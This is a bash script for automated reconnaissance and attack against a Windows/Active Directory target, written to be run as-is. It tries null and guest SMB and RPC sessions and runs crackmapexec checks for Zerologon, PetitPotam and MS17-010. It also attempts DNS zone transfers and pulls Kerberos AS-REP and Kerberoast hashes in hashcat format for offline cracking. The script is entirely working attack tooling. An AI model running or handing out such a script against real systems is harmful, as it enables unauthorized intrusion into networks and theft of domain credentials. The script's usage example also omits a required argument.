#SMB_ALLin1.sh
#take some inputs
if [ $# -lt 3 ]
        then
                echo "Usage: $0 <IP> <Domin_Name> <Valide_users>"
                echo "eg: $0 10.10.10.10 tesla.com"
                exit
        else
                IP="$1"
                Domain_Name="$2"
                Valide_users="$3"
fi
#dsome colors
RED="\e[31m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~NetBios~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} nbtscan $IP ${ENDCOLOR}"
nbtscan $IP
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~SMB Stuff~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} smbmap -H $IP ${ENDCOLOR}"
smbmap -H $IP
echo "${BLUE} smbmap -H $IP -u null -p null ${ENDCOLOR}"
smbmap -H $IP -u null -p null
echo "${BLUE} smbmap -H $IP -u guest -p guest ${ENDCOLOR}"
smbmap -H $IP -u guest -p guest
echo "${BLUE} smbmap -H $IP -u guest -p '' ${ENDCOLOR}"
smbmap -H $IP -u guest -p ''
echo "${BLUE} smbclient -N -L //$IP ${ENDCOLOR}"
smbclient -N -L //$IP
echo "${BLUE} smbclient -U 'Guest' -L //$IP --no-pass ${ENDCOLOR}"
smbclient -U 'Guest' -L //$IP --no-pass
echo "${BLUE} smbclient -N //$IP/ --option="client min protocol"=LANMAN1 ${ENDCOLOR}"
smbclient -N //$IP/ --option="client min protocol"=LANMAN1
echo "${BLUE} crackmapexec smb $IP ${ENDCOLOR}"
crackmapexec smb $IP
echo "${BLUE} crackmapexec smb $IP --pass-pol -u "" -p "" ${ENDCOLOR}"
crackmapexec smb $IP --pass-pol -u "" -p ""
echo "${BLUE} crackmapexec smb $IP --shares -u "" -p "" ${ENDCOLOR}"
crackmapexec smb $IP --shares -u "" -p ""
echo "${BLUE} crackmapexec smb $IP -u "guest" --shares ${ENDCOLOR}"
crackmapexec smb $IP -u "guest" --shares
echo "${BLUE} crackmapexec smb $IP -u 'user' -p 'pass' -M nopac  ${ENDCOLOR}"
#crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac 
echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M petitpotam  ${ENDCOLOR}"
crackmapexec smb $IP -u '' -p '' -M petitpotam 
echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M zerologon ${ENDCOLOR}"
crackmapexec smb $IP -u '' -p '' -M zerologon 
echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M ms17-010 ${ENDCOLOR}"
crackmapexec smb $IP -u '' -p '' -M ms17-010   
echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M ioxidresolver ${ENDCOLOR}"
crackmapexec smb $IP -u '' -p '' -M ioxidresolver

echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~RPC Stuff~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} rpcclient $IP --no-pass ${ENDCOLOR}"
rpcclient $IP --no-pass
echo "${BLUE} rpcclient -U "" $IP --no-pass ${ENDCOLOR}"
rpcclient -U "" $IP --no-pass
echo "${BLUE} rpcclient -U "Guest" $IP --no-pass ${ENDCOLOR}"
rpcclient -U "Guest" $IP --no-pass
echo "${BLUE} rpcclient -U "Guest" -P "Guest" $IP ${ENDCOLOR}"
rpcclient -U "Guest" -P "Guest" $IP 
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~DNS Stuff~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} dig axfr @$IP ${ENDCOLOR}"
dig axfr @$IP
echo "${BLUE} dig axfr @$IP $Domain_Name ${ENDCOLOR}"
dig axfr @$IP $Domain_Name
echo "${BLUE} fierce --domain $Domain_Name --dns-servers $IP ${ENDCOLOR}"
fierce --domain $Domain_Name --dns-servers $IP
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Impacket~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} GetADUsers.py -dc-ip $IP $Domain_Name/ -all ${ENDCOLOR}"
GetADUsers.py -dc-ip $IP "$Domain_Name/" -all
echo "${BLUE} GetNPUsers.py -dc-ip $IP -request "$Domain_Name/" -usersfile $Valide_users -format hashcat ${ENDCOLOR}"
GetNPUsers.py -dc-ip $IP -request "$Domain_Name/" -usersfile $Valide_users -format hashcat
echo "${BLUE} GetUserSPNs.py -dc-ip $IP -request "$Domain_Name/" ${ENDCOLOR}"
GetUserSPNs.py -dc-ip $IP -request "$Domain_Name/"
echo "${BLUE} lookupsid.py guest@$IP --no-pass${ENDCOLOR}"
lookupsid.py guest@$IP --no-pass
echo "${BLUE} getArch.py -target $IP ${ENDCOLOR}"
getArch.py -target $IP

echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~LDAP~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} ldapsearch -h $IP -x -s base namingcontexts ${ENDCOLOR}"
ldapsearch -h $IP -x -s base namingcontexts

#parse variables
#Read the split words into an array based on space delimiter
#IFS='.'
#read -a strarr <<< "$Domain_Name"
#set variables NT and LM
#LM="${strarr[0]}"
#NT="${strarr[1]}"
#echo "${BLUE} ldapsearch -h $IP -x -b "dc=$LM,dc=$NT" ${ENDCOLOR}"
#ldapsearch -h $IP -x -b "dc=$LM,dc=$NT"
